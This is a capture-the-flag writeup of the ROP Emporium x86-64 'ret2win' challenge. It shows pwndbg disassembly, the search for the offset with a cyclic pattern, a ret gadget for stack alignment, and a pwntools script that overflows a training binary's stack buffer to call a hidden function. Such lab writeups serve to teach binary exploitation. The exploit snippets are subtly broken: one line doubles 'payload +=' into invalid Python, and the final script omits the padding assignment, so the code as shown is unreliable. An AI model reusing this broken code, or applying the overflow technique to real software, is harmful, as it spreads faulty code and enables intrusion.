---
title: "ROP Emporium x86-64 Challenge 1: ret2win"
date: "2025-12-24"
description: "Writeup for the ret2win challenge of the x86-64 ROP Emporium challenges."
---

# ROP Emporium x86-64 Challenge 1: ret2win

#### December 24, 2025

This is the first of the eight challenges in the [ROP Emporium](https://ropemporium.com/) CTF website. The challenges are focused on Return Oriented Programming (ROP) attacks, and it's a great website to learn the fundamentals of **binary exploitation**.

After reading the description we know that in order to obtain the flag, we need to execute a specific function in the binary. This function is inaccessible through the normal execution flow of the program. The objective of ROP (and binary exploitation in general) is to find ways to change the flow of a program with our input, either to obtain system control or read data that wouldn't be readable otherwise.

## A small preface
Before starting with the writeup, I always find it important to talk about the tools needed for executing the exploit. To complete every challenge on ROP Emporium, I used two different tools: **pwndbg** to debug through the binary, and **pwntools** to ease the process of creating the input to perform the buffer overflows.

Speaking of buffer overflows, these attacks are a strict requirement for every challenge in this website. You *will* learn to perform them with these challenges, but it's important to know the fundamentals before that.

In this writeup I will gloss over some of the basics, but I might skip some fundamental explanations. However, I have written [an article](blog/how-to-perform-bof) that goes over the very basics of buffer overflows, in case you want to read it before this one.

With this out of the way, let's start with the challenge.

## Initial inspection

Before getting our hands dirty, it's always important to know what we have, what we don't have, and what restrictions exist. Executing the program normally is always a good place to start:

```
$ ./ret2win
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> hello world
Thank you!

Exiting
```

As we can see, the program asks for input, reads it and ends. Our goal is to give it a "magic input" that will allow us to execute a specific function that will allow us to read the flag. But how do we know what function is that? Well, first we need to see all the functions the binary has. For this, we'll use **pwndbg**:

```
& pwndbg ret2win
pwndbg> info functions
0x0000000000400528  _init
0x0000000000400550  puts@plt
0x0000000000400560  system@plt
0x0000000000400570  printf@plt
0x0000000000400580  memset@plt
0x0000000000400590  read@plt
0x00000000004005a0  setvbuf@plt
0x00000000004005b0  _start
0x00000000004005e0  _dl_relocate_static_pie
0x00000000004005f0  deregister_tm_clones
0x0000000000400620  register_tm_clones
0x0000000000400660  __do_global_dtors_aux
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400756  ret2win
0x0000000000400780  __libc_csu_init
0x00000000004007f0  __libc_csu_fini
0x00000000004007f4  _fini
```

With `info functions` we can get every function in the binary and their address in memory. We can see a bunch here. Some of them are **glibc** functions, such as `puts`, `system`, `printf`... but some of them might have caught our attention. Judging by their names, `main`, `pwnme` and `ret2win` seem like functions we'll need to dive into. Let's do that:

```
pwndbg > disas main
   0x0000000000400697 <+0>:	push   rbp
   0x0000000000400698 <+1>:	mov    rbp,rsp
   0x000000000040069b <+4>:	mov    rax,QWORD PTR [rip+0x2009b6]        # 0x601058 <stdout@@GLIBC_2.2.5>
   0x00000000004006a2 <+11>:	mov    ecx,0x0
   0x00000000004006a7 <+16>:	mov    edx,0x2
   0x00000000004006ac <+21>:	mov    esi,0x0
   0x00000000004006b1 <+26>:	mov    rdi,rax
   0x00000000004006b4 <+29>:	call   0x4005a0 <setvbuf@plt>
   0x00000000004006b9 <+34>:	mov    edi,0x400808
   0x00000000004006be <+39>:	call   0x400550 <puts@plt>
   0x00000000004006c3 <+44>:	mov    edi,0x400820
   0x00000000004006c8 <+49>:	call   0x400550 <puts@plt>
   0x00000000004006cd <+54>:	mov    eax,0x0
   0x00000000004006d2 <+59>:	call   0x4006e8 <pwnme>
   0x00000000004006d7 <+64>:	mov    edi,0x400828
   0x00000000004006dc <+69>:	call   0x400550 <puts@plt>
   0x00000000004006e1 <+74>:	mov    eax,0x0
   0x00000000004006e6 <+79>:	pop    rbp
   0x00000000004006e7 <+80>:	ret
```

`disas <function>` allow us to read the assembly code of the given function. With a quick read, we can see that the main function calls `pwnme`. Let's disassemble it too:

```
pwndbg > disas pwnme
   0x00000000004006e8 <+0>:	push   rbp
   0x00000000004006e9 <+1>:	mov    rbp,rsp
   0x00000000004006ec <+4>:	sub    rsp,0x20
   0x00000000004006f0 <+8>:	lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:	mov    edx,0x20
   0x00000000004006f9 <+17>:	mov    esi,0x0
   0x00000000004006fe <+22>:	mov    rdi,rax
   0x0000000000400701 <+25>:	call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:	mov    edi,0x400838
   0x000000000040070b <+35>:	call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:	mov    edi,0x400898
   0x0000000000400715 <+45>:	call   0x400550 <puts@plt>
   0x000000000040071a <+50>:	mov    edi,0x4008b8
   0x000000000040071f <+55>:	call   0x400550 <puts@plt>
   0x0000000000400724 <+60>:	mov    edi,0x400918
   0x0000000000400729 <+65>:	mov    eax,0x0
   0x000000000040072e <+70>:	call   0x400570 <printf@plt>
   0x0000000000400733 <+75>:	lea    rax,[rbp-0x20]
   0x0000000000400737 <+79>:	mov    edx,0x38
   0x000000000040073c <+84>:	mov    rsi,rax
   0x000000000040073f <+87>:	mov    edi,0x0
   0x0000000000400744 <+92>:	call   0x400590 <read@plt>
   0x0000000000400749 <+97>:	mov    edi,0x40091b
   0x000000000040074e <+102>:	call   0x400550 <puts@plt>
   0x0000000000400753 <+107>:	nop
   0x0000000000400754 <+108>:	leave
   0x0000000000400755 <+109>:	ret
```

This function seems to call `read()`, the function that reads our input. Neither `main` nor `pwnme` seem to call `ret2win`, and judging by its name too, it seems like this will be the function we'll have to call from `pwnme`. Via the `read` function in `pwnme` we'll have to perform a buffer overflow by writing many characters in the input.

## Our goal
With the pile of characters we'll plug in as input, we'll hopefully overflow the stack, overwriting its content. Part of its content is the return address of the function, that tells the CPU where to return once the function finishes its execution. If we manage to change that address to the initial address of `ret2win`, we'll manage to redirect the flow of the program to execute said function.

## The execution
This presents one problem: how do we know where in the stack is the return address? Before building our exploit input, we have to find the **offset** of the return address. In other words, the number of characters we'll have to write *before* reaching the return address. We can achieve this in many different ways. In my case, I'll use cyclic patterns. I go over this process more in-depth in [my other article](/blog/how-to-perform-bof), so be sure to read it if you don't understand what's going on.

```
pwndbg> cyclic 200 pat
Written a cyclic sequence of length 200 to file pat
pwndbg> run < pat
```

Running the program with the generated file with the pattern as input will throw a segmentation fault. This is good news. Segmentation faults happen when the program tried reading memory that didn't belong to it. The operative system gives to each program in execution a region if memory. If one program attempts to read a memory address outside this region, a segmentation fault is raised.

```
[ DISASM / x86-64 / set emulate on ]
 ► 0x400755 <pwnme+109>    ret  <0x6161616161616166>
```

If we check the DISASM section of the **pwndbg** output, we'll be able to see which instruction caused the segmentation fault. Lo and behold, it was the return instruction! The instruction attempted to jump into the address `0x6161616161616166`. This number actually coincides with the pattern we created. In ASCII, it translates to `faaaaaaa`. Now we just need to find this string in the pattern we generated, which will give us the offset of the return function:

```
pwndbg> cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

There it is. This means that in our input, we'll have to write 40 characters before reaching the return address. The 41st, 42nd, 43rd and so on characters will be overwritten in the return address, meaning that if we write the address of `ret2win`, it will actually jump to that function, which is our goal. With `info functions`, we can get the address of `ret2win`, so we just need to copy it from there. In the case of this challenge, the address is `0x0000000000400756`.

Just writing the address in our input just like that will not work on x86-64 architectures because it will misalign the stack, this is also explained in the other article, to align it, we need to write a return gadget in the return address offset, and then the actual address of `ret2win`. Getting a return gadget is quite easy:

```
pwndbg> rop
...
0x0040053e : ret
...
```
 
 The `rop` command prints us out a handful of gadgets we might find useful. Believe me, you'll get use to them in the following challenges.

With these two addresses, let's jump to a python script with **pwntools** to create a file we can use as input for the program. This file will contain 40 characters, and right after that the exploit.

```
from pwn import *

OFFSET = 40
RET_INSTRUCTION_ADDRESS = 0x0040053e
EXPLOIT_FUNCTION_ADDRESS = 0x000400756
```

For now I've just imported **pwntools** and added three constant variables with the data we need for the exploit. Now let's generate a string for the payload:

```
from pwn import *

OFFSET = 40
RET_INSTRUCTION_ADDRESS = 0x0040053e
EXPLOIT_FUNCTION_ADDRESS = 0x000400756

payload  = b"A"*OFFSET
```

Notice this "b" before the string. This means the string is in **binary**. We type in 40 "A"s, which are "residue characters" that we use to get ourselves to the return address. Now we need to concatenate the return gadget:

```
from pwn import *

OFFSET = 40
RET_INSTRUCTION_ADDRESS = 0x0040053e
EXPLOIT_FUNCTION_ADDRESS = 0x000400756
payload += payload += p64(RET_INSTRUCTION_ADDRESS)
```

For this we use the `p64()` function, that parses the number properly, considering endianess and length.

```
from pwn import *

OFFSET = 40
RET_INSTRUCTION_ADDRESS = 0x0040053e
EXPLOIT_FUNCTION_ADDRESS = 0x000400756
payload += p64(RET_INSTRUCTION_ADDRESS)
payload += p64(EXPLOIT_FUNCTION_ADDRESS)
open("exploit", "bw").write(payload)
```

After the return instruction address, we add the exploit function address. Then, we just need to write this string to a file that we can later use as input. The exploit is done!

```
$ python3 exploit.py
$ ./ret2win < exploit
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```


